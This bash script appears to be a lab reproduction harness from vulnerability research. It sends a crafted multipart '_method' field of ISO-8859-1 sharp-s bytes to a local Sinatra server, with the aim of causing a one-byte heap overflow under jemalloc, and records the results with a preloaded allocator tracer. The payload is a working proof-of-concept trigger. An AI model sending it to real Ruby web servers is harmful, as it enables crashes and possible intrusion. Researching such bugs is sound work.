#!/bin/bash
# Stock classic Sinatra, wire-only exact-size-class _method under jemalloc.
# Analysis-only: jemtrace observes the case buffer at free via its capa=56
# first qword. No marker, no ObjectSpace, no maps read in the request path.
set -u
cd "$(dirname "$0")/../.." || exit 1
MODE="${1:-attack}"
TAG="${2:-jemwire-$MODE-1}"
PORT="${JEM_WIRE_PORT:-4570}"
export GEM_PATH="$PWD/lab/build/plain/ruby-3.4.12-plain/lib/ruby/gems/3.4.0${GEM_PATH:+:$GEM_PATH}"
export RUBY2SHELL_STOCK_PORT="$PORT"
EV=lab/build/evidence
mkdir -p "$EV"
BODY="$EV/$TAG.body"
LOG="$EV/$TAG.server.log"
OUT="$EV/$TAG.out"
TRACE="$EV/$TAG.trace"
python3 - "$MODE" > "$BODY" <<'PY'
import sys
mode = sys.argv[1]
if mode in ('attack', 'fixed'):
    # 20 expansion bytes consume the +20 slack; 15 invariant bytes; final
    # sharp-s writes one byte past a request-80 mapping buffer.
    data = b'\xdf' * 20 + b'a' * 15 + b'\xdf'
else:
    # Same length and encoding, no expansion: no OOB byte.
    data = b'a' * 36
sys.stdout.buffer.write(
    b'--XB\r\nContent-Disposition: form-data; name="_method"\r\n'
    b'Content-Type: text/plain; charset=ISO-8859-1\r\n\r\n' + data +
    b'\r\n--XB--\r\n')
PY
ROOT="$PWD"
JEM_WIRE_RUBY="${JEM_WIRE_RUBY:-lab/build/plain/ruby-3.4.12-plain/bin/ruby}"
LD_PRELOAD="$ROOT/lab/preload/jemtrace.so:libjemalloc.so.2" \
JEMTRACE_FD=9 \
JEMTRACE_WATCH_SIZE=80 \
JEMTRACE_FREE_Q0=56 \
JEMTRACE_BT_SIZE="${JEM_BT_SIZE:-}" \
  "$JEM_WIRE_RUBY" \
  lab/repro/ruby2shell-stock-baseline.ru > "$LOG" 2>&1 9>"$TRACE" &
PID=$!
READY=NO
for _ in $(seq 1 300); do
  if curl -s -m 1 "http://127.0.0.1:$PORT/" >/dev/null 2>&1; then READY=YES; break; fi
  sleep 0.1
done
{
  echo "== $TAG mode=$MODE ready=$READY"
  curl -s -m 20 -X POST "http://127.0.0.1:$PORT/not-a-route" \
    -H 'Content-Type: multipart/form-data; boundary=XB' \
    --data-binary "@$BODY" -w '\nTRIGGER_HTTP=%{http_code}\n'
  curl -s -m 5 "http://127.0.0.1:$PORT/" -w '\nALIVE_HTTP=%{http_code}\n'
} > "$OUT" 2>&1
if kill -0 "$PID" 2>/dev/null; then ALIVE=YES; else ALIVE=NO; fi
cp "/proc/$PID/maps" "$EV/$TAG.maps" 2>/dev/null || true
kill "$PID" 2>/dev/null
wait "$PID" 2>/dev/null
RC=$?
cat "$OUT"
echo "process-alive=$ALIVE server-rc=$RC"
echo "capa-56 free dumps: $(grep -c '^W ' "$TRACE" || true)"
grep '^W ' "$TRACE" | tail -32
